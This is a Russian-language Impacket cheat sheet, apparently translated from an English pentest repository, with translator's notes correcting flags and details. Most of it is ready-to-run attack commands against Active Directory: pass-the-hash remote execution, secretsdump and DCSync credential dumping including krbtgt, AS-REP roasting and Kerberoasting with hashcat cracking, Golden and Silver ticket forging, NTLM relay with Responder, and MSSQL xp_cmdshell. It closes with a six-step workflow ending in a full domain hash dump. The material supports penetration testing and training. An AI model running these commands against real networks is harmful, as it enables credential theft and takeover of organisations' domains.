<a id="-impacket---python-ad-attack-toolkit"></a>
# 🐍 Impacket — набор инструментов на Python для атак на AD

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Главная](../../README.ru.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Python Network Protocol Toolkit
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Impacket](#-what-is-impacket)
- [Установка](#-installation)
- [Удалённое выполнение команд](#-remote-execution)
- [Извлечение учётных данных](#-credential-dumping)
- [Атаки на Kerberos](#-kerberos-attacks)
- [Атаки на SMB](#-smb-attacks)
- [Атаки на MSSQL](#-mssql-attacks)
- [Запросы LDAP/AD](#-ldapad-queries)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-impacket"></a>
## 🎯 Что такое Impacket

**Impacket** — коллекция классов Python для работы с сетевыми протоколами. Основные возможности для тестирования Active Directory (AD):

- 🎫 **Kerberos** — AS-REP roasting и Kerberoasting (получение данных для автономного подбора паролей), атаки с билетами
- 💻 **Удалённое выполнение команд** — psexec, wmiexec, smbexec, atexec
- 🔓 **Извлечение учётных данных** (credential dumping) — secretsdump, DCSync
- 📁 **SMB** — работа с файлами и ретрансляция аутентификации (relay)
- 🗄️ **MSSQL** — атаки на базы данных

<a id="key-tools"></a>
### Основные инструменты

| Инструмент | Описание |
|------|-------------|
| **psexec.py** | Удалённое выполнение через SMB |
| **wmiexec.py** | Удалённое выполнение через WMI |
| **secretsdump.py** | Извлечение учётных данных и хешей |
| **GetNPUsers.py** | AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | Атаки с ретрансляцией NTLM |
| **smbclient.py** | Клиент SMB |
| **mssqlclient.py** | Клиент MSSQL |

---

<a id="-installation"></a>
## 🚀 Установка

<a id="kali-linux"></a>
### Kali Linux

```bash
# Предустановлен в Kali
impacket-psexec --help

# Или установка/обновление
pip3 install impacket
pip3 install impacket --upgrade
```

<a id="from-github"></a>
### Из GitHub

> **Установка и имена команд:** примеры оригинала сохранены. Разработчики рекомендуют pipx для установки утилит в отдельное окружение; системный Python может запрещать прямую установку через pip. Имена с префиксом `impacket-` зависят от упаковки дистрибутива, тогда как исходные примеры называются `.py`. См. [инструкции Fortra](https://github.com/fortra/impacket#setup).

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Или установка для разработки
pip3 install -e .
```

<a id="verify"></a>
### Проверка

> **Уточнение проверки версии:** атрибут `impacket.__version__` в актуальном пакете не определён, поэтому строка оригинала может завершиться AttributeError. Версия определяется через метаданные пакета в [impacket/version.py](https://github.com/fortra/impacket/blob/master/impacket/version.py). Наличие предустановленных утилит зависит от образа Kali.

```bash
# Проверка установки
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

<a id="-remote-execution"></a>
## 💻 Удалённое выполнение команд

<a id="psexecpy"></a>
### psexec.py

> **Уточнение:** подпись «конкретный общий ресурс» в последнем примере неточна: `-target-ip` задаёт IP-адрес целевого узла. Это не выбор SMB share. См. [параметры psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

```bash
# С паролем
impacket-psexec domain.local/user:password@10.10.10.10

# С хешем NTLM (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Локальный администратор
impacket-psexec administrator:password@10.10.10.10

# Выполнить команду
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Выбрать конкретный общий ресурс
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

<a id="wmiexecpy"></a>
### wmiexec.py

```bash
# Более скрытный вариант, чем psexec
impacket-wmiexec domain.local/user:password@10.10.10.10

# С хешем
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Выполнить команду
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Без вывода (тихий режим)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

<a id="smbexecpy"></a>
### smbexec.py

```bash
# Использует SMB для выполнения
impacket-smbexec domain.local/user:password@10.10.10.10

# С хешем
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Указать общий ресурс
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

<a id="atexecpy"></a>
### atexec.py

```bash
# Использует планировщик заданий
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# С хешем
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

<a id="dcomexecpy"></a>
### dcomexec.py

```bash
# Использует DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Разные объекты DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

<a id="-credential-dumping"></a>
## 🔓 Извлечение учётных данных

<a id="secretsdumppy"></a>
### secretsdump.py

```bash
# Извлечь данные с удалённого узла
impacket-secretsdump domain.local/user:password@10.10.10.10

# Извлечь данные с использованием хеша (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Извлечь данные с контроллера домена (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# DCSync только для конкретного пользователя
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Только хеши NTLM (без ключей Kerberos)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Сохранить результат в файл
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

<a id="dcsync-attack"></a>
### Атака DCSync

> **Уточнение DCSync:** речь идёт о репликации нужных атрибутов учётных записей, включая хеши и ключи, а не о копировании всей базы объектов AD. Обычных учётных данных недостаточно: нужны соответствующие права репликации. См. [описание secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

```bash
# Полный DCSync (извлечение всей базы данных AD)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync для конкретного пользователя
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync для krbtgt (для Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Output format: user:RID:LM:NTLM:::
```

<a id="from-local-files"></a>
### Из локальных файлов

```bash
# Из NTDS.dit + SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Из SAM + SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Из SECURITY + SYSTEM (секреты LSA)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

<a id="-kerberos-attacks"></a>
## 🎫 Атаки на Kerberos

<a id="as-rep-roasting-getnpuserspy"></a>
### AS-REP roasting (GetNPUsers.py)

```bash
# Найти пользователей без предварительной аутентификации (preauth)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# С учётными данными
impacket-GetNPUsers domain.local/user:password -request

# С указанием IP-адреса контроллера домена
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Сохранить результат в файл
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Формат для hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Формат для john
impacket-GetNPUsers domain.local/user:password -request -format john
```

<a id="kerberoasting-getuserspnspy"></a>
### Kerberoasting (GetUserSPNs.py)

```bash
# Найти пользователей, доступных для Kerberoasting
impacket-GetUserSPNs domain.local/user:password

# Запросить билеты TGS
impacket-GetUserSPNs domain.local/user:password -request

# Сохранить результат в файл
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# IP-адрес контроллера домена
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# С хешем
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

<a id="cracking-kerberos-hashes"></a>
### Подбор паролей по хешам Kerberos

> **Тип шифрования:** режимы `18200` и `13100` в этих примерах относятся к данным Kerberos RC4-HMAC (etype 23), а не ко всем вариантам AS-REP/TGS. Формат зависит от типа шифрования; это видно в [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) и [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py).

```bash
# AS-REP (режим hashcat 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (режим hashcat 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# С помощью john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

<a id="gettgtpy"></a>
### getTGT.py

```bash
# Запросить TGT с паролем
impacket-getTGT domain.local/user:password

# Запросить TGT с хешем
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Запросить TGT с ключом AES
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Сохраняет в user.ccache
# Экспортировать для использования:
export KRB5CCNAME=user.ccache
```

<a id="ticketerpy-goldensilver-ticket"></a>
### ticketer.py (Golden/Silver Ticket)

> **Область действия билета:** Silver Ticket из примера выдан для `MSSQLSvc`, а следующий запуск psexec обращается к SMB/CIFS. Такой сервисный билет не даёт универсального доступа ко всем службам; два примера нельзя считать одной гарантированно работающей цепочкой. Поддержка и требования PAC также зависят от версии и конфигурации среды. См. [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) и [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

```bash
# Golden Ticket (поддельный билет TGT)
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket (поддельный сервисный билет)
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Использовать билет
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

<a id="-smb-attacks"></a>
## 📁 Атаки на SMB

<a id="smbclientpy"></a>
### smbclient.py

> **Уточнение:** право записи в SMB share само по себе не предоставляет выполнение команд. smbclient — файловый клиент; соответствующая подпись в конце блока оригинала не содержит команды удалённого выполнения. См. [smbclient.py](https://github.com/fortra/impacket/blob/master/examples/smbclient.py).

```bash
# Подключиться к общему ресурсу
impacket-smbclient domain.local/user:password@10.10.10.10

# Показать общие ресурсы
# (внутри smbclient)
shares

# Подключиться к конкретному общему ресурсу
use SHARE_NAME

# Показать файлы
ls

# Скачать файл
get filename

# Загрузить файл
put localfile

# Выполнить команду
# (если у вас есть право записи в общий ресурс)
```

<a id="smbserverpy"></a>
### smbserver.py

```bash
# Запустить сервер SMB (для вывода данных)
impacket-smbserver share /tmp/share

# С аутентификацией
impacket-smbserver share /tmp/share -username user -password pass

# Поддержка SMB2
impacket-smbserver share /tmp/share -smb2support
```

<a id="ntlmrelayxpy"></a>
### ntlmrelayx.py

> **Совместимость:** `--sam` отсутствует в текущем парсере ntlmrelayx. Извлечение SAM описано как стандартное действие SMB relay при отсутствии команды и при достаточных правах; оно не гарантируется для любой сессии. Пример сохранён как в оригинале. См. [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

```bash
# Базовая ретрансляция (relay)
impacket-ntlmrelayx -tf targets.txt

# Ретрансляция в SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Ретрансляция и выполнение команды
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Извлечение SAM при ретрансляции
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Ретрансляция в LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# С Responder:
# 1. Измените Responder.conf: задайте SMB = Off, HTTP = Off
# 2. Запуск: responder -I eth0
# 3. Запуск: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a id="-mssql-attacks"></a>
## 🗄️ Атаки на MSSQL

<a id="mssqlclientpy"></a>
### mssqlclient.py

```bash
# Подключиться с аутентификацией Windows
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Подключиться с аутентификацией SQL
impacket-mssqlclient sa:password@10.10.10.10

# С хешем
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Подключиться к конкретной базе данных
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

<a id="mssql-commands"></a>
### Команды MSSQL

> **Синтаксис:** `enable_xp_cmdshell` и `xp_cmdshell whoami` здесь — команды интерактивной оболочки Impacket, а не самостоятельные инструкции T-SQL. Заголовок блока `sql` сохранён из оригинала. Выполнение операций зависит от прав SQL Server; см. [mssqlshell.py](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py).

```sql
-- Включить xp_cmdshell
enable_xp_cmdshell

-- Выполнить команду
xp_cmdshell whoami

-- SQL-запрос
SELECT * FROM master.sys.databases

-- Прочитать файл
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

<a id="-ldapad-queries"></a>
## 📂 Запросы LDAP/AD

<a id="getaduserspy"></a>
### GetADUsers.py

```bash
# Показать всех пользователей
impacket-GetADUsers domain.local/user:password -all

# Конкретный контроллер домена
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# С хешем
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

<a id="lookupsidpy"></a>
### lookupsid.py

```bash
# Перечислить пользователей перебором SID
impacket-lookupsid domain.local/user:password@10.10.10.10

# Указать диапазон SID
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

<a id="finddelegationpy"></a>
### findDelegation.py

```bash
# Найти настройки делегирования
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="authentication-options"></a>
### Параметры аутентификации

> **Уточнение AES:** `-aesKey` поддерживает ключи AES как 128, так и 256 бит; подпись AES256 в таблице оригинала неполна. См. [параметры psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

| Параметр | Описание |
|--------|-------------|
| `user:password` | Аутентификация по паролю |
| `-hashes :NTLM` | Хеш NTLM (Pass-the-Hash — аутентификация с использованием хеша) |
| `-hashes LM:NTLM` | Хеш LM:NTLM |
| `-aesKey KEY` | Ключ AES256 |
| `-k -no-pass` | Kerberos с кэшем билетов ccache |

<a id="common-options"></a>
### Общие параметры

| Параметр | Описание |
|--------|-------------|
| `-dc-ip IP` | IP-адрес контроллера домена |
| `-target-ip IP` | IP-адрес целевого узла |
| `-debug` | Включить отладочный вывод |

<a id="remote-execution-summary"></a>
### Сравнение способов удалённого выполнения

> **Уточнение скрытности:** оценки таблицы качественные, а не гарантия отсутствия следов. Эти методы используют разные системные механизмы и могут создавать службы, задачи и сетевой трафик. См. [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) и [atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py).

| Инструмент | Метод | Скрытность |
|------|--------|---------|
| psexec.py | SMB + служба | Низкая |
| wmiexec.py | WMI | Средняя |
| smbexec.py | SMB | Низкая |
| atexec.py | Планировщик заданий | Высокая |
| dcomexec.py | DCOM | Средняя |

<a id="attack-workflow"></a>
### Последовательность атаки

> **Связность примера:** команды первых двух шагов не задают сохранение в `asrep.txt` и `kerberoast.txt`, хотя следующий шаг читает именно эти файлы. Имена файлов и команды сохранены; это сокращённая схема, требующая подготовки входных данных, а не готовый сценарий. См. [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) и [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py).

```bash
# 1. Перечислить пользователей (AS-REP Roast)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Выполнить Kerberoast
impacket-GetUserSPNs domain.local/user:password -request

# 3. Подобрать пароли по хешам
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. Использовать PtH или пароль
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Извлечь учётные данные
impacket-secretsdump domain.local/admin:password@DC01

# 6. DCSync для всех хешей
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Impacket на GitHub](https://github.com/fortra/impacket)
- [Примеры Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [Вики](https://github.com/fortra/impacket/wiki)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [BloodHound](../../BloodHound/translations/README.ru.md)
- [Mimikatz](../../Mimikatz/translations/README.ru.md)
- [Hashcat](../../Hashcat/translations/README.ru.md)

---

<p align="center">
  <b>🐍 Осваивайте тестирование AD с помощью Python!</b><br>
  <i>Impacket — необходимый набор инструментов пентестера</i>
</p>
